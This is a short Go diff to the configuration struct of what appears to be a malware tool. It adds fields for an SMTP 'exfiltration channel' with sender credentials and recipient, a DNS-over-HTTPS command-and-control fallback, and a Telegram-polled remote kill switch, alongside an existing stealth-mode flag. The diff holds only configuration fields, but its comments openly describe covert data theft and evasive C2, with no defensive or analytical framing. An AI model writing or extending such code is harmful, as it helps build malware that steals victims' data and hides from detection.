@@ -22,6 +22,21 @@ type Config struct {
 	EncryptionPassword  string `json:"encryption_password"`  // User-set password for AES key migration
 	LogLocal            bool   `json:"log_local"`
 	Interval            int    `json:"interval"`             // in seconds
+
+	// SMTP Exfiltration Channel
+	SMTPHost            string `json:"smtp_host,omitempty"`   // SMTP server (e.g., smtp.gmail.com)
+	SMTPPort            int    `json:"smtp_port,omitempty"`   // SMTP port (587 for TLS)
+	SMTPUser            string `json:"smtp_user,omitempty"`   // SMTP username/email
+	SMTPPass            string `json:"smtp_pass,omitempty"`   // SMTP password/app password
+	SMTPTo              string `json:"smtp_to,omitempty"`     // Recipient email
+
+	// DNS-over-HTTPS C2 Fallback
+	DoHEndpoint         string `json:"doh_endpoint,omitempty"` // DoH resolver URL
+
+	// Remote Kill Switch
+	KillSwitchEnabled   bool   `json:"kill_switch,omitempty"` // Enable Telegram kill switch polling
+
+	// Runtime-only fields
 	IsInstalled         bool   `json:"-"`                    // Runtime only status
 	StealthMode         bool   `json:"-"`                    // Runtime only status
 }
